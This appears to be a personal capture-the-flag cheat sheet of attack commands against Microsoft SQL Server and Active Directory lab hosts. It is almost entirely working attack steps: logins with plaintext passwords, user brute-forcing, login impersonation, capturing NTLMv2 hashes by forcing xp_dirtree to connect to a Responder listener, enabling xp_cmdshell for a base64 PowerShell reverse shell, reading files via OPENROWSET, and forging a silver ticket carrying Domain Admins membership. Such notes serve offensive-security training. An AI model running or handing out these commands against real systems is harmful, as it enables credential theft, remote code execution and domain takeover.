
MSSQL : 

```
impacket-mssqlclient -port 1433 kevin:'iNa2we6haRj2gaw!'@10.129.226.38


## Window auth 

impacket-mssqlclient rose@sequel.htb -windows-auth

impacket-mssqlclient -windows-auth sequel.htb/sql_svc:'REGGIE1234ronnie'@10.129.228.253

```

Enumerate Users with known creds :

```
netexec mssql dc01.eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!'  --rid-brute --local-auth
```


##### Commands : 

```
SELECT user_name();

SELECT system_user;

enum_db

SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER');


## Database and Tables :

USE financial_planner; 

SELECT table_name FROM information_schema.tables;

SELECT * FROM users WHERE username = 'admin';
```

--- 

##### enum_impersonate


If yes we can impersonate another user login;

```
enum_impersonate
```


```
SQL (kevin  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
b'LOGIN'     b''        IMPERSONATE       GRANT        kevin     appdev 
```

Here we can impersonate appdev user using kevil :

run command;

```
exec_as_login appdev
```

Now check 

```
SELECT SYSTEM_USER;
```


#### Get NTLMv2

Start responder in tun0

```
responder -I tun0  
```

In MSSQL call 

```
EXEC xp_dirtree '\\10.10.16.118\share', 1, 1
```

Save hash and use john or hashcat

#### xp_cmdshell

enable and start :

```
enable_xp_cmdshell
```

```
RECONFIGURE;
```

 Remember to run RECONFIGURE every time we make any changes


```
xp_cmdshell whoami
```


Now we can use powershell reverse shell (Base64) to get a reverse shell

```
xp_cmdshell powershell -e JAB.........AGUAdwAtAE8AYgBqAGUAYwB0A
```


##### Using Metasploit

```
use windows/mssql/mssql_payload
```

```
set database master
```

run

### Read flag 

These commands if allowded would read the files 

```
SELECT * FROM OPENROWSET(BULK N'C:\users\ryan.cooper\desktop\user.txt', SINGLE_CLOB) AS Contents
```

```
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\users\administrator\desktop\root.txt', SINGLE_CLOB) MyFile
```

Or use direct xp_cmdshell :

```
xp_cmdshell dir "c:/Users/mssqlsvc/Desktop"
```

```
xp_cmdshell more "c:/Users/mssqlsvc/Desktop/user.txt"
```



# mssql silver ticket
#silverticket

first get the Domain SID via MSSQL

```
SELECT SUSER_SID('SIGNED\mssqlsvc');
```

we will get something like :
```
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

Now we need to convert this into SID

For that use this one liner :
```
echo "b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'" \
| sed -E "s/.*'([0-9A-Fa-f]+)'.*/\1/" \
| python3 -c 'import sys
h=sys.stdin.read().strip()
b=bytes.fromhex(h)
rev=b[0]; subc=b[1]; id_auth=int.from_bytes(b[2:8],"big")
subs=[str(int.from_bytes(b[8+4*i:12+4*i],"little")) for i in range(subc)]
print("S-{}-{}-{}".format(rev,id_auth,"-".join(subs)))'
```

Got SID :
```
S-1-5-21-4088429403-1159899800-2753317549-1103
```

Ticket Forging : : 

```
impacket-ticketer \
    -nthash "EF699384C3285C54128A3EE1DDB1A0CC" \
    -domain-sid S-1-5-21-4088429403-1159899800-2753317549 \
    -domain signed.htb \
    -spn MSSQLSvc/dc01.signed.htb \
    -groups 512,1105 \
    -user-id 1103 mssqlsvc
 ```

//Explanation: 
 ```
-nthash: is the password in NTLM format
-domain-sid: you know what it is
-domain: you know what it is
-spn: you know what it is

-groups: here I used the 512(Domain Admins) to be able to access local Administrator but also 1105(IT - Domain Group) because that gave me SA access to MSSQL. ****VERY IMPORTANT!!!!****

-user-id: the ID of the user you want to impersonate
mssqlsvc: this was the user I wanted to impersonate
```

Now login :

```
KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient signed.htb/mssqlsvc@dc01.signed.htb -k -no-pass
```

